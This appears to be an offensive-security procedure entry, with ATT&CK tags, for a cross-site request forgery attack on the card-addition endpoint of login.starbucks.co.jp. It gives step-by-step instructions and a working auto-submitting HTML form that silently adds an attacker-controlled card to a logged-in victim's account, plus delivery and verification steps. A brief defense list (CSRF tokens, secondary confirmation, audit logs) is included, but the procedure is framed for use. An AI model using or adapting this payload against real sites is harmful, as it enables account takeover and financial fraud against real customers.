---
id: proc-uuid-003
tags:
  - csrf
  - account-takeover
  - exploitation
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:57.533Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft HTML for Adding Malicious Starbucks Card

## Summary

This procedure creates a CSRF-exploiting HTML file to add a Starbucks card controlled by the attacker to the victim's account on login.starbucks.co.jp, facilitating account takeover upon victim login.

## Description

By forging a request to the card addition endpoint, the procedure adds a card linked to the attacker's details. When the victim logs in, the attacker can use the card for unauthorized access, effectively taking over the account without direct credential compromise.

## Requirements

1. Vulnerable card addition endpoint (login.starbucks.co.jp/add-card)
2. Attacker's Starbucks card details for injection
3. Authenticated victim session
4. Non-Chrome browser

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens for account modification endpoints
- Validate card additions with secondary auth (e.g., email/SMS)
- Audit logs for unexpected card additions

## Objectives

1. Submit forged request to add card
2. Integrate attacker-controlled card into victim's account
3. Achieve takeover via card access

## Instructions

### Step 1: Gather Card Details

**Context**: Prepare the payload with attacker's card info.

Obtain or create a Starbucks card ID/serial under attacker control.

### Step 2: Craft the Malicious HTML

**Context**: Develop HTML to auto-submit the addition request.

Use a form to POST card details to the endpoint.

Example HTML:

```html
<!DOCTYPE html>
<html>
<body>
<form action="https://login.starbucks.co.jp/add-card" method="POST" id="add-card">
  <input type="hidden" name="card_id" value="ATTACKER_CARD_ID">
  <input type="hidden" name="serial" value="ATTACKER_SERIAL">
</form>
<script>document.getElementById('add-card').submit();</script>
</body>
</html>
```

**Expected Output**: Card added successfully (200 OK response).

### Step 3: Deliver and Verify

**Context**: Execute via victim interaction and check account.

Deliver HTML file; after execution, log in as victim to confirm card addition.

**Expected Output**: New card visible in account dashboard.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[account-takeover]]
